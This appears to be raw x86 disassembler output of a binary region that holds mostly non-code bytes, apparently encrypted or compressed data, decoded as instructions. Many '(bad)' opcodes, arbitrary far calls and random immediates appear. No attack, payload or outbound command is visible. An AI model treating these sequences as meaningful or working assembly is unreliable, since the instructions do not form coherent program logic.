  41f8ca:	outs   dx,DWORD PTR ds:[esi]
  41f8cb:	mov    WORD PTR [esi],cs
  41f8cd:	fisubr DWORD PTR [edi+0x34b1b715]
  41f8d3:	pop    ebx
  41f8d4:	cmp    BYTE PTR [ebx],al
  41f8d6:	sub    al,0xf0
  41f8d8:	mov    esp,0x5f2d5516
  41f8dd:	(bad)  
  41f8de:	fld    TBYTE PTR [edi+0x36]
  41f8e1:	outs   dx,DWORD PTR ds:[esi]
  41f8e2:	call   0xef1a:0xd25cdc82
  41f8e9:	je     0x41f8c2
  41f8eb:	lea    edi,[ecx+ebp*2+0x0]
	...
  41f956:	mov    eax,ds:0x3b920b9a
  41f95b:	xchg   ebx,eax
  41f95c:	mov    ecx,0x4183febb
  41f961:	pop    edx
  41f962:	mov    ebx,ebx
  41f964:	dec    esp
  41f965:	(bad)  
  41f966:	addr16 push ebx
  41f968:	add    DWORD PTR [eax],eax
  41f96a:	add    BYTE PTR [ecx],al
  41f96c:	add    BYTE PTR [eax],al
  41f96e:	cmp    dh,0xad
  41f971:	fisubr DWORD PTR [esi]
  41f973:	xchg   esi,eax
  41f974:	sub    ecx,ecx
  41f976:	adc    eax,0x42c2e19c
  41f97b:	in     al,0xca
  41f97d:	xchg   ecx,eax
  41f97e:	push   0x4c
  41f980:	adc    al,0xb0
  41f982:	test   DWORD PTR [ebx],0xc65367fb
  41f988:	add    al,0xd6
  41f98a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f98b:	xor    BYTE PTR [ecx],ah
  41f98d:	dec    ebp
  41f98e:	dec    edi
  41f98f:	out    dx,al
  41f990:	stos   DWORD PTR es:[edi],eax
  41f991:	jb     0x41f977
  41f993:	aas    
  41f994:	mov    cl,0xd9
  41f996:	xor    esi,DWORD PTR [edx]
  41f998:	jl     0x41f996
  41f99a:	and    eax,0x7cd6a96
  41f99f:	(bad)  
  41f9a0:	jmp    0x90cd4b61
  41f9a5:	dec    esp
  41f9a6:	mov    edx,0x62c47e87
  41f9ab:	xchg   esp,eax
  41f9ac:	xchg   BYTE PTR [edi+esi*8+0x451fa1b0],dh
  41f9b3:	retf   0xdfcc
  41f9b6:	pop    edx
  41f9b7:	xchg   ecx,eax
  41f9b8:	jns    0x41f96c
  41f9ba:	mov    bl,0x4f
  41f9bc:	jmp    0x41f9f3
  41f9be:	ror    BYTE PTR [ecx],1
  41f9c0:	jmp    0x4a1fbbd4
  41f9c5:	in     al,dx
  41f9c6:	xor    cl,bl
  41f9c8:	sub    eax,0x56769967
  41f9cd:	retf   
  41f9ce:	into   
  41f9cf:	popf   
  41f9d0:	sbb    eax,0x6cdd180
  41f9d5:	in     al,0x52
  41f9d7:	xor    DWORD PTR [ebp+ecx*4+0x75],0xffffffcc
  41f9dc:	xchg   esi,eax
  41f9dd:	fcompp 
  41f9df:	das    
  41f9e0:	jmp    0x41fa09
  41f9e2:	and    al,0xa6
  41f9e4:	leave  
  41f9e5:	or     eax,DWORD PTR [edx]
  41f9e7:	dec    eax
  41f9e8:	xor    ecx,DWORD PTR [esi]
  41f9ea:	(bad)  
  41f9eb:	(bad)  
  41f9ec:	cmp    eax,esp
  41f9ee:	jo     0x41f9ab
  41f9f0:	jle    0x41fa69
  41f9f2:	cmp    eax,0x1dd15401
  41f9f7:	les    ecx,FWORD PTR [ebx+0x77]
  41f9fa:	sbb    DWORD PTR [ebp+0x192ed8a7],esp
  41fa00:	sub    eax,0xc4d1880
  41fa05:	loope  0x41fa7c
  41fa07:	adc    BYTE PTR [eax-0xf],bh
  41fa0a:	loope  0x41fa70
  41fa0c:	frstor [eax]
  41fa0e:	add    BYTE PTR [edi-0x21912b1],bl
  41fa14:	dec    esp
  41fa15:	pop    eax
  41fa16:	push   eax
  41fa17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa18:	pushf  
  41fa19:	mov    dl,dh
  41fa1b:	fs or  ah,cl
  41fa1e:	jecxz  0x41fa92
  41fa20:	jmp    0x41fa4f
  41fa22:	dec    edx
  41fa23:	cmp    ah,BYTE PTR [ebp-0x1475abf3]
  41fa29:	push   ds
  41fa2a:	shl    DWORD PTR [ecx+0x6f438c30],0xe5
  41fa31:	sub    ecx,ebx
  41fa33:	mov    al,0xf6
  41fa35:	es lahf 
  41fa37:	xchg   DWORD PTR [ebx+0x3b2d1473],edi
  41fa3d:	lock or BYTE PTR [esi+0x54b801d9],ch
  41fa44:	dec    ebp
  41fa45:	in     eax,dx
  41fa46:	or     al,BYTE PTR [edx-0x5702ee64]
  41fa4c:	cmp    eax,0x92afaeb4
  41fa51:	mov    DWORD PTR [edi],ebp
  41fa53:	xor    ah,BYTE PTR [eax+0x5d864ac8]
  41fa59:	jl     0x41f9fb
  41fa5b:	stc    
  41fa5c:	fimul  WORD PTR ds:0xcb6a2fe0
  41fa62:	jg     0x41faa9
  41fa64:	fdivr  DWORD PTR [edi+0x70]
  41fa67:	(bad)  
  41fa68:	out    0x9e,al
  41fa6a:	cs and eax,0xfcb9
	...
  41fad4:	add    BYTE PTR [eax],al
  41fad6:	or     al,BYTE PTR [ecx-0x49]
  41fad9:	mov    eax,ds:0xeb1ef7ff
  41fade:	and    edx,DWORD PTR [edi-0x5d]
  41fae1:	adc    eax,0x7bd0279
  41fae6:	addr16 push esp
  41fae8:	add    DWORD PTR [eax],eax
  41faea:	add    BYTE PTR [ecx],al
  41faec:	add    BYTE PTR [eax],al
  41faee:	test   edi,esi
  41faf0:	add    DWORD PTR [esi+0x3a55f0f1],ebx
  41faf6:	mov    dl,0x48
  41faf8:	push   es
  41faf9:	test   BYTE PTR [ebx-0x40],0x60
  41fafd:	jmp    0x3ec56958
  41fb02:	test   al,0xe0
  41fb04:	and    bl,BYTE PTR [edi]
  41fb06:	adc    eax,0x8ceb2912
  41fb0b:	push   edi
  41fb0c:	adc    al,0x31
  41fb0e:	pop    esp
  41fb0f:	add    cl,BYTE PTR [ebx+0x49]
  41fb12:	push   cs
  41fb13:	int3   
  41fb14:	pushf  
  41fb15:	mov    ds,WORD PTR [edi-0x13]
  41fb18:	into   
  41fb19:	mov    WORD PTR [eax],ss
  41fb1b:	inc    edi
  41fb1c:	adc    eax,0x111cf723
  41fb21:	ds shl esp,1
  41fb24:	je     0x41fb53
  41fb26:	sub    DWORD PTR [esi+0x597d15e0],ebx
  41fb2c:	lods   al,BYTE PTR ds:[esi]
  41fb2d:	mov    al,0x16
  41fb2f:	push   ebx
  41fb30:	scas   eax,DWORD PTR es:[edi]
  41fb31:	pop    esp
  41fb32:	xchg   ebp,eax
  41fb33:	mov    ds:0x7e26915c,eax
  41fb38:	jecxz  0x41fb1e
  41fb3a:	cmp    eax,0x9db1a811
  41fb3f:	mov    DWORD PTR [esi],esp
  41fb41:	out    dx,eax
  41fb42:	pop    eax
  41fb43:	test   eax,0xdd164999
  41fb48:	xchg   BYTE PTR [eax],ch
  41fb4a:	or     BYTE PTR [edi+0x9],bh
  41fb4d:	pop    es
  41fb4e:	inc    esi
  41fb4f:	hlt    
  41fb50:	jbe    0x41fb56
  41fb52:	mov    eax,0xc9487329
  41fb57:	loop   0x41fb96
  41fb59:	pop    esp
  41fb5a:	push   edx
  41fb5b:	adc    esi,esp
  41fb5d:	jecxz  0x41fb23
  41fb5f:	lds    esi,FWORD PTR [ebx+0x28fc570c]
  41fb65:	(bad)  
  41fb66:	adc    eax,0x11b6de5
  41fb6b:	jae    0x41fbd2
  41fb6d:	into   
  41fb6e:	xlat   BYTE PTR ds:[ebx]
  41fb6f:	retf   0x839b
  41fb72:	lea    edi,[edi-0xd638755]
  41fb78:	outs   dx,DWORD PTR ds:[esi]
  41fb79:	mov    ds:0x73aab359,eax
  41fb7e:	xlat   BYTE PTR ds:[ebx]
  41fb7f:	mov    al,ds:0x523351dd
  41fb84:	jo     0x41fb83
  41fb86:	cmp    DWORD PTR [esi-0x50229141],eax
  41fb8c:	jns    0x41fc0b
  41fb8e:	ret    0x8d53
  41fb91:	sbb    ebp,edi
  41fb93:	add    esi,DWORD PTR [edi]
  41fb95:	push   ecx
  41fb96:	xchg   BYTE PTR ds:0x20cea3d,ch
  41fb9c:	cwde   
  41fb9d:	rol    BYTE PTR [esi+0x67e0f98],cl
  41fba3:	push   ebx
  41fba4:	cld    
  41fba5:	jnp    0x41fb7c
  41fba7:	inc    edx
  41fba8:	retf   
  41fba9:	xchg   edx,ebx
  41fbab:	out    0x7,al
  41fbad:	ret    0x28ce
  41fbb0:	(bad)  
  41fbb1:	xchg   ebp,eax
  41fbb2:	jae    0x41fc32
  41fbb4:	test   eax,0xc0b42e21
  41fbb9:	repz sbb eax,DWORD PTR [ebx-0xf]
  41fbbd:	mov    eax,esi
  41fbbf:	call   0xee6c:0xe02de2e9
  41fbc6:	jg     0x41fc45
  41fbc8:	jl     0x41fb71
  41fbca:	out    0x53,eax
  41fbcc:	(bad)  
  41fbcd:	jmp    0xce54:0x203ff23d
  41fbd4:	jne    0x41fc4e
  41fbd6:	pop    ss
  41fbd7:	int3   
  41fbd8:	hlt    
  41fbd9:	and    BYTE PTR [edx],0x24
  41fbdc:	test   cl,dl
  41fbde:	xchg   ch,dl
  41fbe0:	dec    ebx
  41fbe1:	push   0x70
  41fbe3:	scas   al,BYTE PTR es:[edi]
  41fbe4:	and    BYTE PTR cs:[ebp+0x7bd325bf],dh
  41fbeb:	xchg   esp,eax
  41fbec:	jbe    0x41fbad
	...
  41fc56:	fsubr  QWORD PTR [eax]
  41fc58:	mov    ah,ah
  41fc5a:	(bad)  
  41fc5b:	out    0xfe,al
  41fc5d:	cmp    BYTE PTR [esi],ah
  41fc5f:	ret    
  41fc60:	or     DWORD PTR [esi],edx
  41fc62:	dec    esp
  41fc63:	(bad)  
  41fc64:	push   ss
  41fc65:	sbb    DWORD PTR [edi+0x55],esp
  41fc68:	add    DWORD PTR [eax],eax
  41fc6a:	add    BYTE PTR [ecx],al
  41fc6c:	add    BYTE PTR [eax],al
  41fc6e:	xor    DWORD PTR [edx+0x630a8628],edx
  41fc74:	fistp  QWORD PTR [esi-0x29]
  41fc77:	pop    bp
  41fc79:	pop    edi
  41fc7a:	out    0x0,al
  41fc7c:	repnz fbstp TBYTE PTR [eax-0x50ad92a2]
  41fc83:	xor    ch,0x10
  41fc86:	xor    ecx,DWORD PTR [ebx]
  41fc88:	adc    ecx,DWORD PTR [edi+0x364b9a7a]
  41fc8e:	xchg   esi,eax
  41fc8f:	adc    DWORD PTR [ebp+ecx*1-0x11],edx
  41fc93:	mov    al,0xe
  41fc95:	xchg   ecx,eax
  41fc96:	into   
  41fc97:	fucomip st,st(7)
  41fc99:	xor    DWORD PTR [ebx],esi
  41fc9b:	shl    BYTE PTR [ebx],1
  41fc9d:	ror    DWORD PTR [esi-0x5fc8c242],0xfd
  41fca4:	xchg   ebp,eax
  41fca5:	jle    0x41fc2f
  41fca7:	fcom   DWORD PTR [esi-0xdc2c42b]
  41fcad:	cmp    DWORD PTR [ebx+0x2b],0x67730ace
  41fcb4:	call   0x579e:0x55d2a933
  41fcbb:	jb     0x41fcd8
  41fcbd:	sub    ah,BYTE PTR [ebx-0x25]
  41fcc0:	lahf   
  41fcc1:	test   DWORD PTR [eax+0x4d],esi
  41fcc4:	mov    ch,0xd5
  41fcc6:	inc    ebx
  41fcc7:	and    BYTE PTR [edx-0x25],0xa7
  41fccb:	sbb    bh,BYTE PTR [eax-0x6d4ff6ba]
  41fcd1:	scas   al,BYTE PTR es:[edi]
  41fcd2:	loopne 0x41fd48
  41fcd4:	inc    ebp
  41fcd5:	cmp    ebx,ecx
  41fcd7:	inc    edi
  41fcd8:	push   0xced6fffe
  41fcdd:	cli    
  41fcde:	or     al,BYTE PTR [ebx-0x5ae00054]
  41fce4:	add    eax,0x151248ea
  41fce9:	sub    dh,BYTE PTR fs:[ebx+0x5b]
  41fced:	sbb    edx,DWORD PTR [ebp-0x28]
  41fcf0:	mov    ch,0xa0
  41fcf2:	cmp    esp,ecx
  41fcf4:	pop    edx
  41fcf5:	adc    eax,0x96f8a8a1
  41fcfa:	push   esp
  41fcfb:	cwde   
  41fcfc:	(bad)  
  41fcfd:	ins    DWORD PTR es:[edi],dx
  41fcfe:	repz or edx,ebp
  41fd01:	test   al,0xa6
  41fd03:	mov    ch,0x86
  41fd05:	ror    DWORD PTR ds:0x7cf13c79,1
  41fd0b:	js     0x41fd28
  41fd0d:	fistp  DWORD PTR [edi+0x67]
  41fd10:	pop    es
  41fd11:	into   
  41fd12:	dec    esp
  41fd13:	jmp    0x8aec:0x9046b720
  41fd1a:	jg     0x41fd82
  41fd1c:	inc    ebx
  41fd1d:	and    ebx,DWORD PTR [esi]
  41fd1f:	mov    ecx,0x4f613e89
  41fd24:	rcr    DWORD PTR [edx],0x94
  41fd27:	sbb    al,0x4f
  41fd29:	ret    0xe44a
  41fd2c:	jmp    0x2f0e:0xfd33db5f
  41fd33:	pushf  
  41fd34:	scas   al,BYTE PTR es:[edi]
  41fd35:	int3   
  41fd36:	lods   al,BYTE PTR ds:[esi]
  41fd37:	lds    edi,FWORD PTR [ecx+0x2a]
  41fd3a:	cli    
  41fd3b:	cdq    
  41fd3c:	xchg   edx,eax
  41fd3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd3f:	push   ss
  41fd40:	fs xchg esi,eax
  41fd42:	jae    0x41fdb1
  41fd44:	add    al,0xc8
  41fd46:	jmp    0x41fcdf
  41fd48:	xor    al,ah
  41fd4a:	xchg   DWORD PTR [ebp+ebp*4-0x1f],ecx
  41fd4e:	xchg   edi,eax
  41fd4f:	ficom  DWORD PTR [ebp-0x7df9703c]
  41fd55:	fild   WORD PTR [edi]
  41fd57:	add    edx,edx
  41fd59:	pushf  
  41fd5a:	cwde   
  41fd5b:	xor    ch,BYTE PTR [ebx]
  41fd5d:	or     DWORD PTR [eax],ebx
  41fd5f:	push   ss
  41fd60:	rol    DWORD PTR [ecx],cl
  41fd62:	cli    
  41fd63:	in     eax,dx
  41fd64:	sub    edi,ecx
  41fd66:	retf   0x34d6
  41fd69:	jmp    0x0:0xa7118feb
	...
  41fdd4:	add    BYTE PTR [eax],al
  41fdd6:	or     al,0x6a
  41fdd8:	push   edx
  41fdd9:	shl    DWORD PTR [esi-0x7],0x9f
  41fddd:	out    dx,eax
  41fdde:	pop    ds
  41fddf:	pop    edx
  41fde0:	pushf  
  41fde1:	push   ss
  41fde2:	ins    DWORD PTR es:[edi],dx
  41fde3:	imul   edx,DWORD PTR [ebx],0x15667f8
  41fde9:	add    BYTE PTR [eax],al
  41fdeb:	add    DWORD PTR [eax],eax
  41fded:	add    BYTE PTR [esi-0x74d926d1],bh
  41fdf3:	icebp  
  41fdf4:	cli    
  41fdf5:	imul   ecx,DWORD PTR [esi-0x14],0xcf0f4433
  41fdfc:	daa    
  41fdfd:	mov    cs,WORD PTR [ebx+0x7e]
  41fe00:	inc    esp
  41fe01:	mov    bh,0x68
  41fe03:	jns    0x41fe3b
  41fe05:	add    DWORD PTR [ebp-0x5e],edi
  41fe08:	cdq    
  41fe09:	xor    edi,DWORD PTR [ecx+0x69]
  41fe0c:	scas   eax,DWORD PTR es:[edi]
  41fe0d:	std    
  41fe0e:	add    cl,BYTE PTR [esi+0x1eb2bf0e]
  41fe14:	xchg   esp,eax
  41fe15:	pop    ebp
  41fe16:	call   0x9b82:0x9821415c
  41fe1d:	push   ebp
  41fe1e:	ss ret 
  41fe20:	lds    ebx,FWORD PTR [eax]
  41fe22:	mov    esi,0xbbcc851
  41fe27:	and    ecx,DWORD PTR [eax-0x5b45c2f2]
  41fe2d:	xchg   bl,ch
  41fe2f:	mov    ecx,0xb97c3ddd
  41fe34:	or     ah,BYTE PTR ds:0xfdb71a43
  41fe3a:	mov    DWORD PTR [ecx],esi
  41fe3c:	mov    esp,0x1d0ac1f7
  41fe41:	retf   0x460c
  41fe44:	inc    eax
  41fe45:	jl     0x41fe1f
  41fe47:	and    bh,BYTE PTR [ebx+0x4e]
  41fe4a:	mov    cl,0xd
  41fe4c:	or     edx,DWORD PTR [ecx-0x2e]
  41fe4f:	or     dh,bh
  41fe51:	mov    esi,0x4e0d5986
  41fe56:	aaa    
  41fe57:	shl    DWORD PTR [ecx+0x1c241cdc],cl
  41fe5d:	sbb    ah,BYTE PTR [edi-0x2037aa35]
  41fe63:	loop   0x41fee1
  41fe65:	pop    ecx
  41fe66:	(bad)  
  41fe67:	aas    
  41fe68:	cli    
  41fe69:	lock dec ecx
  41fe6b:	and    edi,esp
  41fe6d:	rcl    DWORD PTR [ebx],0xbe
  41fe70:	sub    DWORD PTR [ecx],esi
  41fe72:	dec    eax
  41fe73:	adc    al,0x89
  41fe75:	inc    edi
  41fe76:	bound  ebp,QWORD PTR [ebx+0x68833bd6]
  41fe7c:	xlat   BYTE PTR ds:[ebx]
  41fe7d:	pop    eax
  41fe7e:	repnz mov BYTE PTR [edi],0xb
  41fe82:	pop    edx
  41fe83:	adc    dl,BYTE PTR [edx-0x655962e8]
  41fe89:	fcmovne st,st(5)
  41fe8b:	xor    BYTE PTR [eax-0xc1b2fe2],0x3e
  41fe92:	jno    0x41fed1
  41fe94:	mov    dl,0x69
  41fe96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe97:	aaa    
  41fe98:	into   
  41fe99:	jo     0x41fe3a
  41fe9b:	xchg   BYTE PTR [eax+0x68be1437],ch
  41fea1:	jg     0x41fe8a
  41fea3:	push   cs
  41fea4:	push   ebp
  41fea5:	jae    0x41fece
  41fea7:	jl     0x41fef2
  41fea9:	nop    edi
  41feac:	sub    ebp,DWORD PTR [ecx-0x661cceb0]
  41feb2:	call   0xa89452cf
  41feb7:	inc    ebp
  41feb8:	mov    dl,0x46
  41feba:	push   0xffffffc0
  41febc:	push   esi
  41febd:	test   al,0x91
  41febf:	lahf   
  41fec0:	or     eax,DWORD PTR [eax+0x73]
  41fec3:	sub    BYTE PTR [eax+0x60473b9e],ch
  41fec9:	loope  0x41feb4
  41fecb:	push   eax
  41fecc:	mov    dl,0xce
  41fece:	je     0x41fee8
  41fed0:	ins    DWORD PTR es:[edi],dx
  41fed1:	pop    esi
  41fed2:	jle    0x41fe79
  41fed4:	sbb    dh,dl
  41fed6:	out    dx,eax
  41fed7:	pushf  
  41fed8:	(bad)  
  41fed9:	jmp    0x8ea0:0xffffb8ed
  41fee0:	xor    eax,DWORD PTR [edi+0x5793a524]
  41fee6:	sub    cl,BYTE PTR [edi+0x58b4bb2f]
  41feec:	pop    eax
  41feed:	adc    eax,DWORD PTR [eax]
	...
  41ff53:	add    BYTE PTR [eax],al
  41ff55:	add    BYTE PTR [edx-0x1865ab],ch
  41ff5b:	out    dx,eax
  41ff5c:	call   FWORD PTR [ebp-0x5]
  41ff5f:	(bad)  
  41ff60:	hlt    
  41ff61:	mov    ah,0x80
  41ff63:	les    esi,FWORD PTR [edi+ebx*1+0x67]
  41ff67:	push   edi
  41ff68:	add    DWORD PTR [eax],eax
  41ff6a:	add    BYTE PTR [ecx],al
  41ff6c:	add    BYTE PTR [eax],al
  41ff6e:	pop    edx
  41ff6f:	push   ds
  41ff70:	test   BYTE PTR [ecx-0x49],al
  41ff73:	je     0x41ffba
  41ff75:	dec    ecx
  41ff76:	pop    edx
  41ff77:	ret    
  41ff78:	add    DWORD PTR [ebx-0x25abba9c],esi
  41ff7e:	in     eax,0xfc
  41ff80:	pop    edi
  41ff81:	inc    eax
  41ff82:	jae    0x41ffd6
  41ff84:	ds addr16 push ebp
  41ff87:	pushf  
  41ff88:	or     edi,eax
  41ff8a:	sub    eax,0x4eb3615b
  41ff8f:	aam    0x61
  41ff91:	sub    eax,eax
  41ff93:	arpl   WORD PTR [eax-0x63f9b1a4],ax
  41ff99:	or     ecx,DWORD PTR [edi-0x5aff1240]
  41ff9f:	in     eax,0x7c
  41ffa1:	jle    0x41ffcb
  41ffa3:	inc    ebp
  41ffa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffa5:	ds push ecx
  41ffa7:	cmp    DWORD PTR [edi+0x54],eax
  41ffaa:	call   0x6e1f:0x966ab6d8
  41ffb1:	loope  0x41ff38
  41ffb3:	sahf   
  41ffb4:	mov    ds:0x50eb3f9c,eax
  41ffb9:	mov    ebp,eax
  41ffbb:	mov    ch,0x7d
  41ffbd:	add    edx,esi
  41ffbf:	dec    eax
  41ffc0:	cwde   
  41ffc1:	or     DWORD PTR [esi+0x19],0x19c6b585
  41ffc8:	add    al,al
  41ffca:	call   0xec6f:0x1d5eca1e
  41ffd1:	mov    eax,0x62a29ccd
  41ffd6:	jmp    0x41ff87
  41ffd8:	push   ecx
  41ffd9:	lock cld 
  41ffdb:	bnd jns 0x42001a
  41ffde:	xchg   al,dl
  41ffe0:	imul   ecx,DWORD PTR [esi+0x580458ee],0xfffffff3
  41ffe7:	inc    esp
  41ffe8:	pop    ebp
  41ffe9:	jo     0x41ffe3
  41ffeb:	pop    esp
  41ffec:	into   
  41ffed:	fldcw  WORD PTR [edi+0x12]
  41fff0:	int3   
  41fff1:	jmp    edi
  41fff3:	add    BYTE PTR [ebx+0x6169d97c],ah
  41fff9:	push   cs
  41fffa:	push   cs
  41fffb:	mov    al,0x5e
  41fffd:	rol    BYTE PTR [esi-0x63557953],1
  420003:	xor    ch,BYTE PTR ss:[edx-0x56]
  420007:	xor    ebx,eax
  420009:	fisttp QWORD PTR [edx+eiz*1]
  42000c:	inc    ebx
  42000d:	(bad)  
  42000e:	mov    ebp,0x5195400b
  420013:	push   edi
  420014:	push   ecx
  420015:	jns    0x41ffc2
  420017:	push   0x3a
  420019:	aas    
  42001a:	or     BYTE PTR [eax],al
  42001c:	test   eax,0xd07c3e1d
  420021:	jmp    0x41ffd0
  420023:	test   eax,0x1e59ae60
  420028:	aas    
  420029:	pusha  
  42002a:	mov    ch,0x13
  42002c:	repz lahf 
  42002e:	push   ss
  42002f:	retf   
  420030:	jb     0x420050
  420032:	pusha  
  420033:	popa   
  420034:	daa    
  420035:	pop    ebx
  420036:	mov    ch,0xd
  420038:	add    dl,BYTE PTR [eiz*1+0x5816064]
  42003f:	dec    eax
  420040:	sbb    DWORD PTR [edi-0x80],edi
  420043:	xlat   BYTE PTR ds:[ebx]
  420044:	inc    ebp
  420045:	adc    DWORD PTR [esi+0x470cf065],esp
  42004b:	adc    al,0x4f
  42004d:	xchg   ebx,eax
  42004e:	add    al,0x97
  420050:	enter  0x4e3c,0xc3
  420054:	inc    ebp
  420055:	fdivr  QWORD PTR [ecx-0x30e8d39e]
  42005b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42005c:	inc    ecx
  42005d:	cmp    eax,0xd2e928ea
  420062:	mov    ebx,0x7afdd2f0
  420067:	jp     0x42009d
  420069:	out    0xb9,al
  42006b:	xchg   ebx,eax
  42006c:	jmp    0x420094
	...
  4200d5:	add    BYTE PTR [edx-0x5b],ah
  4200d8:	jbe    0x420159
  4200da:	idiv   edi
  4200dc:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0x12
  4200e3:	add    ebx,DWORD PTR [esi]
  4200e5:	mov    eax,0x15867
  4200ea:	add    BYTE PTR [ecx],al
  4200ec:	add    BYTE PTR [eax],al
  4200ee:	or     DWORD PTR [edx],ebx
  4200f0:	repnz int3 
  4200f2:	sbb    ecx,ebx
  4200f4:	scas   eax,DWORD PTR es:[edi]
  4200f5:	xchg   ecx,eax
  4200f6:	mov    edx,0x3862bd60
  4200fb:	cmp    dl,dh
  4200fd:	xor    DWORD PTR [eax-0x2b7cd5d5],edx
  420103:	jne    0x42013e
  420105:	arpl   WORD PTR [edi+0x6d171156],bp
  42010b:	adc    ebx,eax
  42010d:	arpl   di,bx
  42010f:	dec    edi
  420110:	push   0x913daf8c
  420115:	mov    cl,0xbb
  420117:	shr    DWORD PTR [edx+0x1fb16740],0x95
  42011e:	inc    esi
  42011f:	xchg   ecx,eax
  420120:	xchg   esi,eax
  420121:	pop    es
  420122:	pop    ds
  420123:	pusha  
  420124:	scas   al,BYTE PTR es:[edi]
  420125:	mov    ds:0xcbaafe8e,eax
  42012a:	arpl   di,bp
  42012c:	jg     0x4200cb
  42012e:	cli    
  42012f:	jo     0x420153
  420131:	sbb    DWORD PTR [edx+0x3afdc958],esp
  420137:	call   0xbb48c170
  42013c:	push   eax
  42013d:	mov    WORD PTR ds:0x394e336d,?
  420143:	adc    al,ah
  420145:	push   es
  420146:	xchg   dh,cl
  420148:	dec    ebp
  420149:	js     0x42017b
  42014b:	lahf   
  42014c:	mov    ?,ecx
  42014e:	cmp    BYTE PTR [ecx],bl
  420150:	sahf   
  420151:	addr16 pop ss
  420153:	push   ss
  420154:	push   ebp
  420155:	jp     0x4201a4
  420157:	mov    ch,0x5f
  420159:	call   0x2388:0xe2e13981
  420160:	je     0x4201b3
  420162:	sub    eax,0x402a8902
  420167:	shl    BYTE PTR [ecx],0x80
  42016a:	inc    edi
  42016b:	mov    ds:0x36dfd5ed,al
  420170:	ror    DWORD PTR ds:0x5cd40819,0xca
  420177:	scas   eax,DWORD PTR es:[edi]
  420178:	add    ecx,DWORD PTR [edi+0x66c1953d]
  42017e:	(bad)  
  42017f:	ret    
  420180:	push   esp
  420181:	test   eax,0xf091873
  420186:	pop    esi
  420187:	ficomp DWORD PTR [ebp-0x1d]
  42018a:	jb     0x42016a
  42018c:	xchg   BYTE PTR [edi-0xa01b7a6],bl
  420192:	repz call 0xbc5a:0xd588134a
  42019a:	ja     0x42011d
  42019c:	pop    es
  42019d:	pop    es
  42019e:	jae    0x420177
  4201a0:	adc    al,BYTE PTR [edi+0x269066d4]
  4201a6:	cmp    dh,BYTE PTR [esi]
  4201a8:	loopne 0x4201ff
  4201aa:	sub    al,0x3
  4201ac:	cmp    al,BYTE PTR ds:[edx]
  4201af:	xchg   ebx,eax
  4201b0:	add    ebp,DWORD PTR [edx]
  4201b2:	mov    dl,0x93
  4201b4:	aaa    
  4201b5:	inc    esi
  4201b6:	push   edi
  4201b7:	or     al,0xd9
  4201b9:	sub    BYTE PTR [edx-0x3f],dl
  4201bc:	aam    0x40
  4201be:	mov    edi,0x732befea
  4201c3:	dec    ecx
  4201c4:	add    ch,dh
  4201c6:	xor    al,0x34
  4201c8:	in     eax,dx
  4201c9:	add    eax,0xa13f3985
  4201ce:	stos   DWORD PTR es:[edi],eax
  4201cf:	xor    eax,0xf60c76cd
  4201d4:	cmc    
  4201d5:	test   al,0xe8
  4201d7:	ret    0x245b
  4201da:	test   BYTE PTR [ecx+0x764d70f0],al
  4201e0:	ficomp WORD PTR [esi-0x4a]
  4201e3:	pop    ecx
  4201e4:	addr16 rcr esi,1
  4201e7:	pushf  
  4201e8:	push   es
  4201e9:	and    dh,BYTE PTR [edi]
  4201eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201ec:	stos   DWORD PTR es:[edi],eax
  4201ed:	jno    0x4201ef
	...
  420253:	add    BYTE PTR [eax],al
  420255:	add    BYTE PTR [ebx-0x31],dh
  420258:	fwait
  420259:	cmp    DWORD PTR [edi-0x27300c83],edi
  42025f:	stos   BYTE PTR es:[edi],al
  420260:	sar    BYTE PTR [ebx-0x182c854],1
  420266:	addr16 pop ecx
  420268:	add    DWORD PTR [eax],eax
  42026a:	add    BYTE PTR [ecx],al
  42026c:	add    BYTE PTR [eax],al
  42026e:	in     eax,dx
  42026f:	inc    ebx
  420270:	retf   0xb181
  420273:	out    0x5c,eax
  420275:	jnp    0x4202a2
  420277:	sbb    eax,0x6c63734b
  42027c:	or     ch,BYTE PTR [ebp-0x76bacf5f]
  420282:	je     0x420291
  420284:	mov    esp,0x112b533a
  420289:	mov    edi,eax
  42028b:	dec    esi
  42028c:	sbb    esi,DWORD PTR [ecx]
  42028e:	jmp    0x3cd7:0x27a74b25
  420295:	ds arpl si,dx
  420298:	bound  eax,QWORD PTR [ecx]
  42029a:	push   0xffffffe4
  42029c:	push   ebp
  42029d:	mov    ebp,0x6251fc6e
  4202a2:	inc    edi
  4202a3:	(bad)  
  4202a5:	cld    
  4202a6:	leave  
  4202a7:	mov    bl,0x97
  4202a9:	fcmovne st,st(3)
  4202ab:	dec    ebp
  4202ac:	adc    BYTE PTR [ebp+0x12d664c0],ch
  4202b2:	addr16 push ebp
  4202b4:	cli    
  4202b5:	xor    edi,esi
  4202b7:	add    DWORD PTR [ebx],eax
  4202b9:	pop    ebp
  4202ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202bc:	dec    esp
  4202bd:	in     eax,0xa0
  4202bf:	jbe    0x420256
  4202c1:	push   ebp
  4202c2:	jecxz  0x420306
  4202c4:	(bad)  [eax]
  4202c6:	mov    bl,BYTE PTR ds:0xf99dc364
  4202cc:	dec    ebx
  4202cd:	hlt    
  4202ce:	pop    esi
  4202cf:	or     edx,eax
  4202d1:	xchg   DWORD PTR [ebx],esi
  4202d3:	add    esp,DWORD PTR [ecx]
  4202d5:	stos   BYTE PTR es:[edi],al
  4202d6:	test   DWORD PTR [ecx+eax*4],0x7db663e8
  4202dd:	cs test eax,0x22628a8b
  4202e3:	fs push 0xffffff8d
  4202e6:	cmp    al,0xa9
  4202e8:	inc    ebp
  4202e9:	int    0x5
  4202eb:	retf   
  4202ec:	sub    cl,BYTE PTR [ebp-0x7c]
  4202ef:	cmp    eax,0x89c66c4f
  4202f4:	mov    ds:0xcae33b07,eax
  4202f9:	dec    ecx
  4202fa:	adc    DWORD PTR [esi],esi
  4202fc:	ror    DWORD PTR [esi+0x23],1
  4202ff:	pop    ss
  420300:	stos   DWORD PTR es:[edi],eax
